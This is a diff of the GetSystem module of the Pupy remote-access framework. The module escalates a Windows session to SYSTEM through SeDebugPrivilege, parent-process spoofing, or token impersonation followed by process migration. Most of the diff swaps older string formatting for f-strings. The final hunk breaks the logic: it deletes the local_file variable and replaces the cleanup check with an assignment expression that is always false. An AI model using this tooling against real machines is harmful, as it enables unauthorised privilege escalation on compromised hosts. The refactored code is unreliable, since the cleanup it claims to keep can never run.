@@ -66,9 +66,6 @@ class GetSystem(PupyModule):
         # Command to execute on the target
         cmdToExecute = None
 
-        # The the local file which contains PS1 script (when powershell chosen or enabled automcatically)
-        local_file = ''
-
         # True if ps1 script will be used in bind mode. If reverse connection with ps1 then False
         isBindLauncherForPs1 = False
 
@@ -105,7 +102,7 @@ class GetSystem(PupyModule):
                     try:
                         listeningPort = int(input("[?] Give me the listening port to use on the target: "))
                     except Exception as e:
-                        self.warning("You have to give me a valid port. Try again. ({})".format(e))
+                        self.warning(f"You have to give me a valid port. Try again. ({e})")
                 listeningAddress = addressPort.split(':')[0]
                 listeningAddressPortForBindPs1 = "{0}:{1}".format(listeningAddress, listeningPort)
                 self.info("The ps1 script used for getting a pupy session as SYSTEM will be configured for listening on {0} on the target".format(listeningAddressPortForBindPs1))
@@ -124,7 +121,9 @@ class GetSystem(PupyModule):
             self.info('Trying to configure for running the current executable on the target as SYSTEM')
             exe = self.client.desc['exec_path'].split('\\')
             if exe[len(exe)-1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':
-                self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])
+                self.warning(
+                    f"It seems that your current process is {self.client.desc['exec_path']}"
+                )
                 self.warning('It is not recommended to restart it')
                 return
 
@@ -143,19 +142,19 @@ class GetSystem(PupyModule):
             try:
                 enable_privilege = self.client.remote('pupwinutils.security', 'EnablePrivilege', False)
                 enable_privilege('SeDebugPrivilege')
-                self.success('{} enabled'.format('SeDebugPrivilege'))
+                self.success('SeDebugPrivilege enabled')
             except Exception as e:
-                self.error('{} was not enabled: {}'.format('SeDebugPrivilege', e.args[1]))
+                self.error(f'SeDebugPrivilege was not enabled: {e.args[1]}')
 
             create_new_process_from_ppid = self.client.remote(
                 'pupwinutils.security', 'create_new_process_from_ppid', False)
 
             if args.parentID:
                 self.info('Using the Parent Process method on the pid {0}...'.format(args.parentID))
-                self.info('Command: {}'.format(cmdToExecute))
+                self.info(f'Command: {cmdToExecute}')
 
                 pid = create_new_process_from_ppid(int(args.parentID), cmdToExecute)
-                self.success('Created: pid={}, ppid={}'.format(pid, args.parentID))
+                self.success(f'Created: pid={pid}, ppid={args.parentID}')
                 return
 
             else:
@@ -169,7 +168,7 @@ class GetSystem(PupyModule):
                 for aprocess in enum_processes():
                     integrityLevel = get_integrity_level(aprocess['pid'])
 
-                    if not integrityLevel == 'System':
+                    if integrityLevel != 'System':
                         continue
 
                     self.info("{0} (pid {1}) has a 'SYSTEM' integrity level, trying to use it".format(
@@ -177,11 +176,11 @@ class GetSystem(PupyModule):
 
                     try:
                         pid = create_new_process_from_ppid(aprocess['pid'], cmdToExecute)
-                        self.success('Created: pid={}, ppid={}'.format(pid, aprocess['pid']))
+                        self.success(f"Created: pid={pid}, ppid={aprocess['pid']}")
                         break
 
                     except Exception as e:
-                        self.error('Failed: {}'.format(' '.join(x for x in e.args if type(x) is str)))
+                        self.error(f"Failed: {' '.join(x for x in e.args if type(x) is str)}")
 
         elif args.method == 'impersonate':
             if cmdToExecute is None:
@@ -190,7 +189,7 @@ class GetSystem(PupyModule):
             getsystem = self.client.remote('pupwinutils.security', 'getsystem', False)
             proc_pid = getsystem(cmdToExecute)
 
-            self.success('Impersonated, pid={}. Migrating..'.format(proc_pid))
+            self.success(f'Impersonated, pid={proc_pid}. Migrating..')
             migrate(self, proc_pid, keep=args.keep, timeout=args.timeout)
             return
 
@@ -206,5 +205,5 @@ class GetSystem(PupyModule):
             else:
                 self.success('Waiting for a connection (take few seconds, 1 min max)...')
 
-            if local_file:
+            if local_file := '':
                 os.remove(local_file)
